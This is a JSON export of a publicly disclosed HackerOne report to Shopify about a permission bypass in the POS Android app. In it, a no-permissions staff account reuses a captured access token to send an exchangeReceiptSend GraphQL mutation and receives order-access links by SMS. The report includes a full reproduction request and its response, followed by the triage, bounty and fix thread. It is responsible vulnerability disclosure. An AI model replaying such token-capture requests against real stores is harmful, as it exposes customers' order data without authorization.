{"id":917875,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MTc4NzU=","url":"https://hackerone.com/reports/917875","title":"STAFF \"No-Permissions\" on the Store can retrieve the details Order via exchangeReceiptSend","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-07-07T11:12:56.446Z","submitted_at":"2020-07-07T11:12:56.446Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"langduvnsec","url":"/langduvnsec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-08-24T16:41:33.753Z","bug_reporter_agreed_on_going_public_at":"2020-08-24T16:41:33.715Z","team_member_agreed_on_going_public_at":"2020-08-18T19:50:52.044Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I discovered a bug in an android mobile app that allowed STAFF No Permissions using Receipt Send to Mobile of any Order information in the Store.\n\n#Steps to reproduce:\n**1)** STAFF account is created and assigned \"No Permissions\" on a Shop by Owner/Admin\n**2)** STAFF then login to shop. Notice that STAFF is not having any access to menus.\n**3)** Log in to Shopify POS on Android. Access will not allow the application, but it will call /admin/api/unstable/shop.json before logging out. Now there will be an **X-Shopify-Access-Token** parameter. I use Telerik Fiddler to capture packets on the Shopify POS App.\n**4)** Now STAFF triggers the below GraphQL request via a burp proxy.\n```\nPOST https://langduvnsec.myshopify.com/admin/api/unversioned/graphql HTTP/1.1\nX-Shopify-Access-Token: xxxxxxxxxxxxxxxxxxxxxxxx\nuser-agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G955N Build/NRD90M.G955NKSU1AQDC) Shopify POS 3.50.0/22606\nAccept: application/json\nContent-Type: application/json; charset=utf-8\nContent-Length: 456\nHost: langduvnsec.myshopify.com\nConnection: Keep-Alive\nAccept-Encoding: gzip\n\n{ \"query\": \"fragment ExchangeErrorFragment on ExchangeError { __typename code field message } mutation ExchangeReceiptSend($exchangeId: ID!, $input: ExchangeReceiptSendRecipientInput!) { __typename exchangeReceiptSend(exchangeId: $exchangeId, recipient: $input) { __typename exchange { __typename id } userErrors { __typename ... ExchangeErrorFragment } } }\", \"variables\": {\"exchangeId\":\"gid://shopify/Exchange/605028374\",\"input\":{\"phone\":\"+84332947000\"}}}\n```\n**5)** Replace your Exchange_ID and Phone number to get the details order access link. Please use your country's Phone Area Code to receive messages.\n#Response: ███████\n```\n{\n  \"data\": {\n    \"__typename\": \"Mutation\",\n    \"exchangeReceiptSend\": {\n      \"__typename\": \"ExchangeReceiptSendPayload\",\n      \"exchange\": {\n        \"__typename\": \"Exchange\",\n        \"id\": \"gid://shopify/Exchange/605028374\"\n      },\n      \"userErrors\": []\n    }\n  },\n  \"extensions\": {\n    \"cost\": {\n      \"requestedQueryCost\": 10,\n      \"actualQueryCost\": 10,\n      \"throttleStatus\": {\n        \"maximumAvailable\": 300000.0,\n        \"currentlyAvailable\": 299990,\n        \"restoreRate\": 15000.0\n      }\n    }\n  }\n}\n```\n#SMS Response: ████ and ██████████\n```\npVCSdKiitos, ett teit vaihdoit ostoksen kaupasta langduvnsec!  Alkuperinen tilaus:  langduvnsec.myshopify.com/26192052246/orders/8356d9c67229a59ae4634b94d514d548/authenticate?key=bbf35fac2c88bc3bd6b53cc14e2110f3 Uusi tilaus:  langduvnsec.myshopify.com/26192052246/orders/02418bf7e3604d4c5a09aba909193dc8/authenticate?key=38a448bc14b62c4cff031eb97e6ac186asfo\n```\n\n## Impact\n\nSTAFF \"No-Permissions\" on the Store can retrieve the details Order via exchangeReceiptSend","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":5,"voters":["thaivu","drsniper","ali","realtess","b69fb2ebda43240ece9dbeb"],"severity":{"rating":"medium","score":6.9,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":37199,"asset_type":"OTHER","asset_identifier":"Shopify Mobile Applications","max_severity":"medium"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8526193,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi team\nI have tested this GraphQL on 2 platforms: website and android. The results show that GraphQL on the website has been fixed, but it can still be exploited on Android. This means an attacker can use this opening to attack the store.","automated_response":false,"created_at":"2020-07-07T11:23:37.424Z","updated_at":"2020-07-07T11:23:37.424Z","actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8528005,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nThank you for the report and for your patience while we investigate this ticket. Shopify has a company-wide hackathon this week so we will not be triaging non-critical tickets until Monday. Thanks for understanding, and we will get back to you as soon as we can.\n\n- Jack","automated_response":false,"created_at":"2020-07-07T14:27:45.357Z","updated_at":"2020-07-07T14:27:45.357Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8528442,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi jack\nThanks for letting me know, good luck in the contest. See you next week !","automated_response":false,"created_at":"2020-07-07T15:06:34.387Z","updated_at":"2020-07-07T15:06:34.387Z","actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8589332,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Is there any update?","automated_response":false,"created_at":"2020-07-14T01:21:08.393Z","updated_at":"2020-07-14T01:21:08.393Z","actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8613770,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hope the team has time to watch it.","automated_response":false,"created_at":"2020-07-16T01:11:31.829Z","updated_at":"2020-07-16T01:15:21.759Z","actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8616166,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi team,\nI added an impact:\nThis vulnerability is only visible and allowed to act for STAFF with a missing minimum \"Order Permissions\". But with GraphQL vulnerable, STAFF No Permissions on the Store can retrieve order information via exchangeReceiptSend","automated_response":false,"created_at":"2020-07-16T09:05:30.275Z","updated_at":"2020-07-16T09:05:30.275Z","actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8619653,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @langduvnsec,\n\nSorry for the delay, we're still looking into this report.","automated_response":false,"created_at":"2020-07-16T14:50:04.350Z","updated_at":"2020-07-16T14:50:04.350Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8624081,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Howdy @langduvnsec,\n\nThank you for your patience. \n\nWe've validated this issue, and our engineering team is working on a fix. We'll be in touch with you again next week with a bounty decision.","automated_response":false,"created_at":"2020-07-16T23:13:55.677Z","updated_at":"2020-07-16T23:13:55.677Z","actor":{"username":"zack_spotify","cleared":false,"url":"/zack_spotify","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/261/793/78a81f701248b9e632d5de7b037e5e0eedd37560_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8624400,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @zack_spotify \nThanks so much for the reply. \nHave a nice day !","automated_response":false,"created_at":"2020-07-17T00:38:31.033Z","updated_at":"2020-07-17T00:38:31.033Z","actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8688252,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Is there any update for me?","automated_response":false,"created_at":"2020-07-22T16:12:56.363Z","updated_at":"2020-07-22T16:12:56.363Z","actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8703169,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for your report, and sorry for the delay in getting back to you.\n\nWe're awarding a $1,000 bounty for this issue under the \"Circumvention of user permission model\" category for Shopify Core. This falls near the lower end of the bounty range because the bug discloses information about orders, but only for orders that are associated with an exchange.\n\nWe'll be in touch again once the issue is resolved.","automated_response":false,"created_at":"2020-07-22T22:53:59.455Z","updated_at":"2020-07-22T22:53:59.455Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"langduvnsec","url":"/langduvnsec"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8717151,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bounty. Glad to keep your platform safe !","automated_response":false,"created_at":"2020-07-23T10:09:00.787Z","updated_at":"2020-07-23T10:09:00.787Z","actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8728128,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We recently deployed a fix for this issue, and this operation should only be accessible to users with Orders permission.\n\nWe look forward to hearing from you again soon. Happy hacking!","automated_response":false,"created_at":"2020-07-23T19:22:29.976Z","updated_at":"2020-07-23T19:22:29.976Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"langduvnsec","url":"/langduvnsec"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8734950,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the quick fix, it's fun to keep your platform secure.","automated_response":false,"created_at":"2020-07-24T05:34:01.804Z","updated_at":"2020-07-24T05:34:01.804Z","actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8972342,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-18T19:50:52.081Z","updated_at":"2020-08-18T19:50:52.081Z","first_to_agree":true,"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8973717,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I want limited disclosure, because in this report disclosing private video.","automated_response":false,"created_at":"2020-08-19T00:54:37.924Z","updated_at":"2020-08-19T00:54:37.924Z","actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9025493,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @langduvnsec,\n\nWe're happy to do limited disclosure. We can also redact the video you're talking about if you are okay with disclosure of everything else. Let us know which one works for you.","automated_response":false,"created_at":"2020-08-24T16:04:42.249Z","updated_at":"2020-08-24T16:04:42.249Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9025791,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jack_mccracken \n..............","automated_response":false,"created_at":"2020-08-24T16:35:43.376Z","updated_at":"2020-08-24T16:41:47.853Z","actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9025812,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @langduvnsec,\n\nI've redacted all the attachments in this report. Feel free to agree to disclosure.","automated_response":false,"created_at":"2020-08-24T16:37:31.514Z","updated_at":"2020-08-24T16:37:31.514Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9025853,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-24T16:41:33.734Z","updated_at":"2020-08-24T16:41:33.734Z","actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9025854,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-08-24T16:41:33.776Z","updated_at":"2020-08-24T16:41:33.776Z","actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}